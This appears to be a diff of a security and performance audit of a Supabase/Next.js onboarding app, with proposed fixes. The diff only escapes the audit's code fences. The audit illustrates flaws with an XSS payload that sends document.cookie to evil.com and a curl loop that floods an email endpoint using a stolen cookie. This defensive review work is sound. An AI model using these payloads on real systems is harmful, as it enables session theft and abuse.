@@ -15,7 +15,7 @@
 **The Crime:** You're taking user input and writing it DIRECTLY to the database with ZERO sanitization, ZERO Zod validation, ZERO XSS protection.
 
 **Attack Vector:**
-```typescript
+\`\`\`typescript
 // Current code - A hacker's paradise
 <Input 
   value={formData.field1 || ''} 
@@ -24,7 +24,7 @@
 // Then you literally just... save it
 const { error } = await supabase.from("client_step_progress")
   .update({ data: { ...currentProgress.data, ...formData } })
-```
+\`\`\`
 
 **What goes wrong:**  
 1. Client types: `<script>fetch('https://evil.com?data=' + document.cookie)</script>`
@@ -46,12 +46,12 @@ const { error } = await supabase.from("client_step_progress")
 **The Crime:** You're loading ALL clients into the browser, then filtering in JavaScript
 
 **Current code:**
-```typescript
+\`\`\`typescript
 const filteredClients = clients.filter((client) => {
   const matchesSearch = client.name.toLowerCase().includes(searchQuery.toLowerCase())
   return matchesSearch && matchesStatus
 })
-```
+\`\`\`
 
 **The Math of Failure:**
 - 1,000 clients × 500KB per client = 500MB RAM
@@ -71,10 +71,10 @@ const filteredClients = clients.filter((client) => {
 **The Crime:** Your "expiry check" is worthless
 
 **Current code:**
-```typescript
+\`\`\`typescript
 const diffDays = Math.ceil(Math.abs(now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24))
 if (diffDays > 90) { /* show error */ }
-```
+\`\`\`
 
 **Why this is garbage:**
 1. You calculate expiry but NEVER store `expires_at` in the database
@@ -101,12 +101,12 @@ if (diffDays > 90) { /* show error */ }
 **The Crime:** Your INSERT policies just check `EXISTS` but don't validate ownership
 
 **Current code:**
-```sql
+\`\`\`sql
 CREATE POLICY "clients_insert_policy" ON clients
 FOR INSERT WITH CHECK (
   EXISTS (SELECT 1 FROM workspace_members WHERE workspace_id = NEW.workspace_id)
 );
-```
+\`\`\`
 
 **The Flaw:**
 - This checks if ANY member exists in that workspace
@@ -130,7 +130,7 @@ FOR INSERT WITH CHECK (
 **The Crime:** You're doing multi-level array operations IN THE BROWSER on ALL data
 
 **Death Code:**
-```typescript
+\`\`\`typescript
 const completedWithTime = onboardings.filter((o) => o.completed_at && o.created_at)
 const avgTimeToComplete = completedWithTime.length > 0
   ? completedWithTime.reduce((sum, o) => {
@@ -139,7 +139,7 @@ const avgTimeToComplete = completedWithTime.length > 0
       return sum + (end - start)
     }, 0) / completedWithTime.length / (1000 * 60 * 60 * 24)
   : 0
-```
+\`\`\`
 
 **Complexity Analysis:**
 - 10 onboardings = fine
@@ -164,13 +164,13 @@ const avgTimeToComplete = completedWithTime.length > 0
 **The Crime:** Any authenticated user can spam your email API
 
 **Attack:**
-```bash
+\`\`\`bash
 for i in {1..10000}; do
   curl -X POST /api/send-onboarding-invite \
     -H "Cookie: session=stolen_cookie" \
     -d '{"email":"victim@test.com"}'
 done
-```
+\`\`\`
 
 **Result:**
 - 10,000 emails sent in 1 minute
@@ -190,9 +190,9 @@ done
 **The Crime:** You're using `window.location.origin` which can be spoofed
 
 **Current code:**
-```typescript
+\`\`\`typescript
 emailRedirectTo: process.env.NEXT_PUBLIC_DEV_SUPABASE_REDIRECT_URL || `${window.location.origin}/`
-```
+\`\`\`
 
 **Attack:**
 1. Hacker creates phishing site: `boardingpass-secure-login.com`
@@ -214,11 +214,11 @@ emailRedirectTo: process.env.NEXT_PUBLIC_DEV_SUPABASE_REDIRECT_URL || `${window.
 **The Crime:** Zero E2E tests means you deploy bugs to production
 
 **Evidence:**
-```bash
+\`\`\`bash
 $ ls tests/
 e2e/onboarding-flow.spec.ts  # Created but never run
 unit/validation.test.ts       # Created but never run
-```
+\`\`\`
 
 **What goes wrong:**
 1. You "fix" the portal page
@@ -257,13 +257,13 @@ unit/validation.test.ts       # Created but never run
 **The Crime:** Your build exposes ALL `NEXT_PUBLIC_*` vars to the client bundle
 
 **Current usage:**
-```typescript
+\`\`\`typescript
 // lib/supabase/client.ts
 createBrowserClient(
   process.env.NEXT_PUBLIC_SUPABASE_URL!,
   process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
 )
-```
+\`\`\`
 
 **What's exposed:**
 - `NEXT_PUBLIC_SUPABASE_URL` (public, fine)
@@ -336,7 +336,7 @@ Never accidentally expose server-side secrets like service role keys or private 
 
 **Hardened Version:**
 
-```typescript
+\`\`\`typescript
 "use client"
 
 import { useState } from "react"
@@ -500,12 +500,12 @@ export function ClientPortal({ onboarding, token }: ClientPortalProps) {
     </>
   )
 }
-```
+\`\`\`
 
 **Required Dependencies:**
-```bash
+\`\`\`bash
 npm install zod isomorphic-dompurify
-```
+\`\`\`
 
 ---
 
@@ -552,9 +552,9 @@ You have a high-fidelity prototype that LOOKS production-ready but has critical 
 ## Next Steps
 
 1. **TODAY:** Install dependencies
-   ```bash
+   \`\`\`bash
    npm install zod isomorphic-dompurify @upstash/ratelimit
-   ```
+   \`\`\`
 
 2. **THIS WEEK:** Fix Critical #1-#3 (input validation, client-side filtering, token expiry)
 
